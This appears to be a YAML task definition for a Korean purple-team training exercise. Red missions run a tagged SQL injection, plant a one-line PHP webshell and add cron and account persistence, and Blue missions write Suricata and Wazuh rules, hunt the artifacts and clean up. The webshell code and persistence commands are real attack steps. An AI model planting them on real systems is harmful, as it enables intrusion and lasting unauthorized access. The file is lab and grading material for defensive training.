@@ -1,0 +1,327 @@
+id: "soc-adv-w13"
+category: "soc-adv"
+title: "[SOC고급 W13] Purple Team — ATT&CK 공격 체인 vs 단계별 탐지 검증"
+difficulty: "hard"
+time_limit: 3000
+battle_type: "1v1"
+description: |
+  SOC 고급과정 13주차 — **Purple Team**. Red(공격)와 Blue(방어)가 **협업**해 "우리 탐지가 실제로 작동하는가"를
+  단계별로 검증하고 즉시 개선한다. 이 주차는 본래부터 공격과 방어의 통합이라 공방전 형식과 가장 잘 맞는다.
+  공격자는 ATT&CK 다단계 체인을 실행하고, 관제팀(너)은 각 단계의 탐지 성공/실패를 매트릭스로 정리하고 갭을 메운다.
+
+  ▸ 이야기
+    공격자가 Initial Access(SQLi→웹쉘) → Persistence(cron+계정) 체인을 실행한다. 관제팀은 ① 웹공격 단계
+    Suricata 탐지, ② 지속성 단계 Wazuh 탐지를 배포하고, ③ 실제로 각 단계 흔적을 탐지·검증하고, ④ 단계별
+    탐지 매트릭스와 갭 분석을, ⑤ Purple Team 성과지표·Navigator·종합 보고로 마무리한다.
+
+  ▸ 모드
+    • solo : 한 학생이 Red 체인 실행 후 Blue 탐지 검증. 대상 = 본인 인프라.
+    • duel : Red 가 상대(Blue) 인프라에 체인을 실행, Blue 는 자기 인프라에서 단계별 탐지.
+
+  ▸ 공격자 위치(중요)
+    Red 미션은 **attacker-ext(SSH 2203)** 외부 침입자 기준. Red 채점은 **대상 인프라의 흔적(WAF audit / 웹쉘·
+    cron·계정)** 으로 한다.
+
+  ▸ 이번 주차 전용 마커
+    공격 태그 **`sa13r1-<본인id>`**, 웹쉘 **`/var/www/html/.sa13shell.php`**, cron 지속성 **`/etc/cron.d/sa13persist`**
+    (마커 `sa13`), 계정 **`soca13`**, Suricata 룰 **sid 9613131**, Wazuh 룰 **id 102131**. 종료 시 cleanup.
+
+red_missions:
+  - order: 1
+    assess_target: opponent
+    target_vm: web
+    points: 18
+    instruction: |
+      ## 🎯 RED-1 [Initial Access → Execution] — SQLi 후 웹쉘 확보
+
+      ### 상황
+      Purple Team 체인의 1·2단계다. 태그 `sa13r1-<본인id>` SQLi 로 침투하고, 웹쉘 **`/var/www/html/.sa13shell.php`**
+      로 실행 발판을 확보한다. Blue 가 각 단계를 탐지하는지 확인한다.
+
+      ### 할 일 (attacker-ext → 발판 후)
+      예시(id=kim):
+      ```bash
+      curl -s -A "sqlmap/1.7" -H "Host: dvwa.6v6.lab" \
+        "http://<대상_공개IP>/vulnerabilities/sqli/?id=sa13r1-kim%27%20UNION%20SELECT%201--+&Submit=Submit"
+      cat > /var/www/html/.sa13shell.php <<'PHP'
+      <?php /* sa13 */ system($_POST['c'] ?? ''); ?>
+      PHP
+      ```
+
+      ### 채점 방법
+      대상 WAF audit 에 태그 `sa13r1` 가 남고, 웹쉘 `/var/www/html/.sa13shell.php` 가 있는지로 채점.
+
+      ### 합격 기준
+      대상 WAF audit 에 `sa13r1` 탐지가 있거나 웹쉘 파일이 존재한다.
+    hint: "태그(sa13r1) SQLi + 웹쉘 /var/www/html/.sa13shell.php. 채점: log_contains modsec sa13r1 + file_exists 웹쉘."
+    verify:
+      type: "log_contains"
+      expect: "sa13r1"
+      checks:
+        - { id: "red-1-1", type: "log_contains", target: "web",
+            params: { log: "modsec", pattern: "sa13r1", since_sec: 1800 } }
+        - { id: "red-1-2", type: "file_exists", target: "web", params: { path: "/var/www/html/.sa13shell.php" } }
+      semantic:
+        intent: "Initial Access(T1190)+Execution(T1505.003 웹쉘) — Purple 체인 1·2단계. 대상 WAF audit 태그(sa13r1) + 웹쉘 파일."
+        success_criteria:
+          - "WAF audit 에 sa13r1 탐지 또는 웹쉘 파일 존재"
+          - "두 단계(침투→실행)의 연결 서술"
+        acceptable_methods:
+          - "attacker-ext 태그 SQLi + 웹쉘 배치"
+        negative_signs:
+          - "태그/웹쉘 모두 부재"
+
+  - order: 2
+    assess_target: opponent
+    target_vm: web
+    points: 17
+    instruction: |
+      ## 🎯 RED-2 [Persistence] — cron + 계정으로 지속성
+
+      ### 상황
+      체인의 3단계(Persistence)다. cron **`/etc/cron.d/sa13persist`** 와 계정 **`soca13`** 으로 재부팅 생존
+      발판을 만든다. Blue 의 지속성 탐지가 작동하는지 확인한다.
+
+      ### 할 일
+      ```bash
+      echo '*/10 * * * * root /bin/bash -c "id # sa13" >/dev/null 2>&1' | sudo tee /etc/cron.d/sa13persist
+      sudo useradd -m -s /bin/bash soca13
+      ```
+
+      ### 채점 방법
+      대상 호스트에 `/etc/cron.d/sa13persist`(마커 `sa13`)가 있거나 `/etc/passwd` 에 `soca13` 이 있는지로 채점.
+
+      ### 합격 기준
+      `/etc/cron.d/sa13persist`(마커 `sa13`)가 존재하거나 `/etc/passwd` 에 `soca13` 이 있다.
+    hint: "cron /etc/cron.d/sa13persist (마커 sa13) + useradd soca13. 채점: file_contains cron sa13 + file_contains passwd soca13."
+    verify:
+      type: "file_contains"
+      expect: "sa13"
+      checks:
+        - { id: "red-2-1", type: "file_contains", target: "web",
+            params: { path: "/etc/cron.d/sa13persist", pattern: "sa13" } }
+        - { id: "red-2-2", type: "file_contains", target: "web",
+            params: { path: "/etc/passwd", pattern: "soca13" } }
+      semantic:
+        intent: "Persistence(T1053.003 cron + T1136 계정) — Purple 체인 3단계. 재부팅 생존 발판."
+        success_criteria:
+          - "/etc/cron.d/sa13persist(마커 sa13) 또는 계정 soca13"
+          - "지속성 기법 서술"
+        acceptable_methods:
+          - "cron.d 파일 + useradd"
+        negative_signs:
+          - "흔적 미생성"
+
+blue_missions:
+  - order: 1
+    assess_target: self
+    target_vm: ips
+    points: 16
+    instruction: |
+      ## 🛡️ BLUE-1 [단계 탐지: 웹공격] — Suricata 룰 (sid 9613131)
+
+      ### 상황
+      Purple Team 은 "각 단계가 탐지되는가"를 검증한다. RED-1 의 웹공격 단계를 잡는 Suricata 룰(**sid 9613131**)을 배포한다.
+
+      ### 할 일
+      ```
+      alert http any any -> any any (msg:"SOCADV-W13 purple SQLi UNION"; flow:to_server; http.uri; content:"UNION"; nocase; content:"SELECT"; nocase; sid:9613131; rev:1;)
+      ```
+      ```bash
+      sudo suricatasc -c reload-rules
+      ```
+
+      ### 채점 방법
+      ips 의 `local.rules` 에 sid 9613131 룰이 있는지로 확인.
+
+      ### 합격 기준
+      `local.rules` 에 웹공격 단계를 보는 sid 9613131 룰이 존재한다.
+    hint: "웹공격 단계 Suricata 룰(sid 9613131, UNION SELECT) → reload. 채점: file_contains local.rules 9613131."
+    verify:
+      type: "file_contains"
+      expect: "9613131"
+      checks:
+        - { id: "blue-1-1", type: "file_contains", target: "ips",
+            params: { path: "/etc/suricata/rules/local.rules", pattern: "9613131" } }
+      semantic:
+        intent: "Purple 단계 탐지(네트워크) — Initial Access/Execution 단계 Suricata 룰. 탐지 매트릭스의 한 칸."
+        success_criteria:
+          - "local.rules 에 sid 9613131"
+          - "이 룰이 체인의 어느 단계를 덮는지 명시"
+        acceptable_methods:
+          - "Suricata 룰 작성 + reload"
+        negative_signs:
+          - "패턴 부정확 / 문법 오류"
+
+  - order: 2
+    assess_target: self
+    target_vm: siem
+    points: 15
+    instruction: |
+      ## 🛡️ BLUE-2 [단계 탐지: 지속성] — Wazuh 룰 (id 102131)
+
+      ### 상황
+      RED-2 의 지속성 단계를 잡는 Wazuh 룰(**id 102131**)을 배포한다.
+
+      ### 할 일
+      ```xml
+      <group name="edu,purple,">
+        <rule id="102131" level="12">
+          <if_group>edu</if_group>
+          <match>cron.d</match>
+          <description>SOCADV-W13 - purple team persistence stage detection</description>
+        </rule>
+      </group>
+      ```
+      ```bash
+      sudo /var/ossec/bin/wazuh-control restart
+      ```
+
+      ### 채점 방법
+      `local_rules.xml` 에 id 102131 룰이 있는지로 확인.
+
+      ### 합격 기준
+      `local_rules.xml` 에 지속성 단계를 보는 id 102131 룰이 존재한다.
+    hint: "지속성 단계 Wazuh 룰(id 102131, cron.d) → restart. 채점: file_contains local_rules.xml 102131."
+    verify:
+      type: "file_contains"
+      expect: "102131"
+      checks:
+        - { id: "blue-2-1", type: "file_contains", target: "siem",
+            params: { path: "/var/ossec/etc/rules/local_rules.xml", pattern: "102131" } }
+      semantic:
+        intent: "Purple 단계 탐지(호스트) — Persistence 단계 Wazuh 룰. 탐지 매트릭스의 또 한 칸."
+        success_criteria:
+          - "local_rules.xml 에 rule id 102131"
+          - "지속성(cron/계정) 단계 탐지 로직"
+        acceptable_methods:
+          - "Wazuh 룰 작성 + restart"
+        negative_signs:
+          - "탐지 로직 부실 / XML 오류"
+
+  - order: 3
+    assess_target: self
+    target_vm: web
+    points: 15
+    instruction: |
+      ## 🛡️ BLUE-3 [탐지 검증] — 각 단계 흔적 실제 확인
+
+      ### 상황
+      Purple Team 의 핵심은 "탐지가 실제로 됐는지"를 검증하는 것이다. RED 가 남긴 웹쉘(`/var/www/html/.sa13shell.php`)과
+      cron 지속성(`/etc/cron.d/sa13persist`)을 실제로 찾아 단계별 탐지 성공/실패를 확정하고 제거한다.
+
+      ### 할 일
+      ```bash
+      ls -al /var/www/html/.sa13shell.php 2>/dev/null
+      cat /etc/cron.d/sa13persist 2>/dev/null ; sudo getent passwd | grep soca13
+      ```
+      보고서에 단계별(탐지됨/미탐) + "발견 → 제거" 로 적는다.
+
+      ### 채점 방법
+      대상 호스트에서 웹쉘 또는 cron 지속성이 헌팅되는지로 채점(발견이 핵심).
+
+      ### 합격 기준
+      웹쉘 `/var/www/html/.sa13shell.php` 또는 cron `/etc/cron.d/sa13persist` 를 식별한다(식별 후 제거 보고).
+    hint: "웹쉘/cron 실제 확인 → 단계별 탐지 검증 + 제거. 채점: file_exists 웹쉘 + file_contains cron sa13(발견 핵심)."
+    verify:
+      type: "file_exists"
+      expect: "/var/www/html/.sa13shell.php"
+      checks:
+        - { id: "blue-3-1", type: "file_exists", target: "web", params: { path: "/var/www/html/.sa13shell.php" } }
+        - { id: "blue-3-2", type: "file_contains", target: "web",
+            params: { path: "/etc/cron.d/sa13persist", pattern: "sa13" } }
+      semantic:
+        intent: "Purple 탐지 검증 — 각 단계 흔적을 실제로 확인해 탐지 성공/실패 확정 + 제거. 발견과 전수조사 핵심."
+        success_criteria:
+          - "웹쉘 또는 cron 지속성 식별"
+          - "단계별 탐지 성공/실패 명시 + 가설/질의 제시"
+          - "발견→제거(음성 결과 포함)"
+        acceptable_methods:
+          - "ls/cat/getent/Wazuh 로 발견 — 도구보다 발견·검증 핵심"
+        negative_signs:
+          - "단계 흔적 누락 / 검증 없음"
+
+  - order: 4
+    assess_target: self
+    target_vm: siem
+    points: 18
+    instruction: |
+      ## 🛡️ BLUE-4 [탐지 매트릭스·갭 분석] — Navigator 시각화
+
+      ### 상황
+      Purple Team 의 산출은 **탐지 매트릭스**다. 공격 단계(Initial Access/Execution/Persistence/Lateral/Exfil)별로
+      탐지 성공/실패와 기여 도구(Wazuh/Suricata/WAF)를 정리하고, 미탐 단계의 근본 원인(데이터소스/룰 부재/우회)을 분석한다.
+
+      ### 할 일
+      보고서에:
+      - 단계 × 도구 탐지 매트릭스(✓/✗ + 어떤 룰이 기여했는지)
+      - 갭 분석: 미탐 단계의 근본 원인 + 개선 룰
+      - ATT&CK Navigator layer 개념(탐지=초록/미탐=빨강)
+      ```bash
+      sudo tail -200 /var/ossec/logs/alerts/alerts.json | \
+        python3 -c 'import sys,json;[print(json.loads(l).get("rule",{}).get("id")) for l in sys.stdin if l.strip()]' | sort | uniq -c | sort -rn | head
+      ```
+
+      ### 채점 방법
+      본인 SIEM 에 최근 경보가 수집돼 있는지 + 제출한 탐지 매트릭스/갭 분석으로 채점.
+
+      ### 합격 기준
+      본인 SIEM 에 최근 경보가 있다(+ 단계별 탐지 매트릭스·갭 분석·Navigator 개념은 제출로 검증).
+    hint: "단계×도구 탐지 매트릭스(✓/✗ + 기여 룰) + 미탐 근본원인 갭 분석 + Navigator layer 개념. 채점: wazuh_alert + 제출."
+    verify:
+      type: "wazuh_alert"
+      expect: "alert"
+      checks:
+        - { id: "blue-4-1", type: "wazuh_alert", target: "siem", params: { since_sec: 1800 } }
+      semantic:
+        intent: "Purple 매트릭스 — 단계별 탐지 성공/실패 + 도구 기여 + 갭 근본원인 + Navigator. 분석형 — 실제 탐지 결과 매핑 시 점수 상승."
+        success_criteria:
+          - "최근 경보 수집 확인"
+          - "단계×도구 탐지 매트릭스(이번 룰 9613131/102131 반영)"
+          - "미탐 단계 갭 근본원인 + Navigator 개념"
+        acceptable_methods:
+          - "탐지 매트릭스 + 갭 분석"
+        negative_signs:
+          - "매트릭스/갭 누락"
+
+  - order: 5
+    assess_target: self
+    target_vm: siem
+    points: 19
+    instruction: |
+      ## 🛡️ BLUE-5 [종합·Cleanup] — 성과 지표 + 프로그램 + 위생
+
+      ### 상황
+      Purple Team 의 산출물이다. 연습 전후 **탐지 커버리지/MTTD/신규 룰 수**를 정량화하고, 분기별 Purple Team
+      **프로그램**(일정/시나리오/역할)을 설계하고, R/B/P 회고 후 아티팩트를 **일괄 cleanup** 한다.
+
+      ### 할 일
+      - 성과 지표(커버리지 전후 + MTTD + 신규 룰 수) + 분기별 프로그램
+      - R/B/P 회고 + cleanup:
+      ```bash
+      sudo rm -f /var/www/html/.sa13shell.php /etc/cron.d/sa13persist; sudo userdel -r soca13 2>/dev/null
+      sudo sed -i '/9613131/d' /etc/suricata/rules/local.rules && sudo suricatasc -c reload-rules
+      # local_rules.xml 에서 102131 블록 제거 후 wazuh-control restart
+      ```
+
+      ### 채점 방법
+      본인 SIEM 에 최근 경보가 수집돼 있는지 + 제출한 성과 지표/프로그램/회고/cleanup 으로 채점.
+
+      ### 합격 기준
+      본인 SIEM 에 최근 경보가 있다(+ 성과 지표·프로그램·회고·cleanup 은 제출로 검증).
+    hint: "탐지 커버리지 전후 + MTTD + 신규 룰 수 + 분기별 Purple 프로그램 + R/B/P 회고 + 웹쉘/cron/soca13/9613131/102131 일괄 cleanup. 채점: wazuh_alert + 제출."
+    verify:
+      type: "wazuh_alert"
+      expect: "alert"
+      checks:
+        - { id: "blue-5-1", type: "wazuh_alert", target: "siem", params: { since_sec: 1800 } }
+      semantic:
+        intent: "Purple Team 종합 — 성과 지표(커버리지/MTTD/신규룰) + 프로그램 + R/B/P 회고 + cleanup. Purple Team 보고서."
+        success_criteria:
+          - "최근 경보 수집 확인"
+          - "연습 전후 성과 지표 + 분기별 프로그램"
+          - "R/B/P 회고 + 아티팩트 일괄 cleanup"
+        acceptable_methods:
+          - "성과 지표 + 프로그램 + 회고 + cleanup"
+        negative_signs:
+          - "지표/프로그램 누락 / cleanup 미완"
